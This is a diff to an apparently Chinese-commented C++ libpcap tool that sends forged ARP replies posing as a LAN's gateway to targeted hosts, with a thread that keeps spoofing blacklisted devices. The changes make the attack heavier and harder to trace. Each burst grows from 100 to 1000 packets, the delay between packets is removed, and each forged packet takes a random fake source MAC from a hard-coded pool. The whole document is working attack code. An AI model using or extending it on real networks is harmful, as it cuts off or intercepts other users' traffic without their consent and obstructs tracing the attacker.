@@ -18,6 +18,9 @@
 #include <pcap/pcap.h>
 #include <algorithm>
 #include <thread>
+#include <cstdlib>
+#include <ctime>
+#include <array>
 #include <atomic>
 
 
@@ -50,6 +53,37 @@ struct arp_header {
   uint8_t target_ip[4];
 };
 
+// MAC地址池
+std::vector<std::array<uint8_t, 6>> mac_pool = {
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x56},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x57},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x58},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x59},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5A},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5B},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5C},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5D},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5E},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5F},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x60},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x61},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x62},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x63},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x64},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x65},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x66},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x67},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x68},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x69},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6A},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6B},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6C},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6D},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6E},
+  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6F},
+};
+
 // 全局状态
 std::mutex mtx;
 std::atomic<bool> running{false};
@@ -60,6 +94,15 @@ std::string gateway_ip;
 pcap_t* pcap_handle = nullptr;
 std::atomic<bool> switch_status{true};
 
+// 初始化随机数生成器
+void init_random() {
+  std::srand(static_cast<unsigned int>(std::time(nullptr)));
+}
+
+// 从MAC地址池中随机选择一个MAC地址
+const uint8_t* get_random_mac() {
+  return mac_pool[std::rand() % mac_pool.size()].data();
+}
 
 // 将6字节MAC地址转换为字符串格式
 std::string mac_to_string(const uint8_t mac[6]) 
@@ -329,28 +372,20 @@ arp_header create_arp_reply(const uint8_t* src_mac, const std::string& src_ip, c
 }
 
 // 发送ARP欺骗包
-#define ARP_SPOOF_PACKET_COUNT 100
-
+#define ARP_SPOOF_PACKET_COUNT 1000
 void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* attacker_mac, const std::string& gateway_ip) 
 {
+  // 初始化随机数生成器
+  static bool initialized = false;
+  if (!initialized) {
+    init_random();
+    initialized = true;
+  }
+
   // 检查目标IP是否与网关IP相同，如果相同则直接返回
   if (target.ip == gateway_ip) {
     return;
   }
-
-  // 预先分配好数据包缓冲区
-  static uint8_t packets[sizeof(ether_header) + sizeof(arp_header)];
-
-  ether_header* eth = reinterpret_cast<ether_header*>(packets);
-  arp_header* arp = reinterpret_cast<arp_header*>(packets + sizeof(ether_header));
-
-  // 构造以太网头
-  memcpy(eth->ether_dhost, target.mac, ETH_ALEN);
-  memcpy(eth->ether_shost, attacker_mac, ETH_ALEN);
-  eth->ether_type = htons(ETH_P_ARP);
-
-  // 构造ARP头
-  *arp = create_arp_reply(attacker_mac, gateway_ip, target.mac, target.ip);
 
   // 获取当前时间
   auto now = std::chrono::system_clock::now();
@@ -362,11 +397,23 @@ void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* 
             << ",伪造网关IP: " << gateway_ip << std::endl;
   // 发送数据包
   for (int i = 0; i < ARP_SPOOF_PACKET_COUNT; ++i) {
+    // 预先分配好数据包缓冲区
+    static uint8_t packets[sizeof(ether_header) + sizeof(arp_header)];
+    ether_header* eth = reinterpret_cast<ether_header*>(packets);
+    arp_header* arp = reinterpret_cast<arp_header*>(packets + sizeof(ether_header));
+
+    // 构造以太网头
+    memcpy(eth->ether_dhost, target.mac, ETH_ALEN);
+    const uint8_t* random_mac = get_random_mac();
+    memcpy(eth->ether_shost, random_mac, ETH_ALEN);
+    eth->ether_type = htons(ETH_P_ARP);
+
+    // 构造ARP头
+    *arp = create_arp_reply(random_mac, gateway_ip, target.mac, target.ip);
+    
     if (pcap_sendpacket(handle, packets, sizeof(ether_header) + sizeof(arp_header)) != 0) {
       std::cerr << "发送失败: " << pcap_geterr(handle) << std::endl;
     }
-
-    usleep(300);
   }
 }
 
@@ -400,7 +447,6 @@ void start_blacklist_thread(const std::string& ip, const uint8_t* mac, const std
 
     std::string mac_str = mac_to_string(mac); // 将MAC地址转换为字符串
     while (true) {
-      std::cout << blacklist.count(mac_str) << std::endl;
       std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
       if (blacklist.count(mac_str) == 0) {
         break; // 如果IP已从黑名单中移除，则终止线程
